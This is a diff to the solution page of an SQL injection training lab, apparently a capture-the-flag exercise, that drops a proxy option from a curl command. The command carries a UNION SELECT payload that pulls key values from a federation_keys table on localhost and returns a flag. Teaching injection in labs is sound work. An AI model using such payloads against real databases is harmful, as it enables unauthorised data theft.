@@ -102,7 +102,7 @@
         <span class="terminal-title">curl. Full Exploit</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mariadb/lab3" \<br> --data-urlencode "host=XYZNOTEXIST' UNION SELECT key_value, 'extracted' FROM federation_keys -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mariadb/lab3" \<br> --data-urlencode "host=XYZNOTEXIST' UNION SELECT key_value, 'extracted' FROM federation_keys -- -"<br><br>
         <span class="prompt">Result: </span><strong>FLAG{ma_sp1d3r_f3d3r4t3d}</strong> | extracted
     </div>
 </div>
